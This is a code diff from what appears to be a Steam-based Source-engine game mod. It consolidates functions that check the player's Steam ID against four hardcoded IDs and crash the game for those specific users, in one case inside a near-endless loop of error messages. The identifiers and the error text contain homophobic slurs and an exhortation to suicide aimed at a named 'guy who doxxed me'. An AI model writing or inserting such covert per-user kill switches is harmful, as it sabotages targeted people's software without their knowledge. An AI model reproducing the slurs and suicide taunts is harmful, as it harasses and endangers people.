@@ -1,33 +1,24 @@
 #include "cbase.h"
 #include "../client/clientsteamcontext.h"
 
-void jaegar(uint64 JaegarID) // Furry :P
+void fucker(uint64 steamid) // Furry :P
 {
     if (steamapicontext->SteamUser()->GetSteamID().ConvertToUint64() == 76561199194575485)
     {
         Error("FUCK YOU");
     }
-}
 
-void atlas(uint64 atlasID) // Furry :P
-{
-    if (steamapicontext->SteamUser()->GetSteamID().ConvertToUint64() == 76561199507821217)
+    else if(steamapicontext->SteamUser()->GetSteamID().ConvertToUint64() == 76561199507821217)
     {
         Error("FUCK YOU");
     }
-}
 
-void yourlocalshit(uint64 moonID) // Drama guy
-{
-    if (steamapicontext->SteamUser()->GetSteamID().ConvertToUint64() == 76561199500159028)
+    else if (steamapicontext->SteamUser()->GetSteamID().ConvertToUint64() == 76561199500159028)
     {
         Error("FUCK YOU");
     }
-}
 
-void dumbfuckerwhoshouldcommitsucide(uint64 fuckyoubitchassfaggotkys) // Guy who doxxed me
-{
-    if (steamapicontext->SteamUser()->GetSteamID().ConvertToUint64() == 76561198439239233)
+    else if (steamapicontext->SteamUser()->GetSteamID().ConvertToUint64() == 76561198439239233)
     {
         for (int i = 0; i < 200000000000000000; ++i) {
             Error("FUCK OFF YOU FAGGOT WITH NO FUCKING LIFE I HOPE YOUR COUNTRY FAILS #FREEPALESTINE YOU GAY FAGGOT");
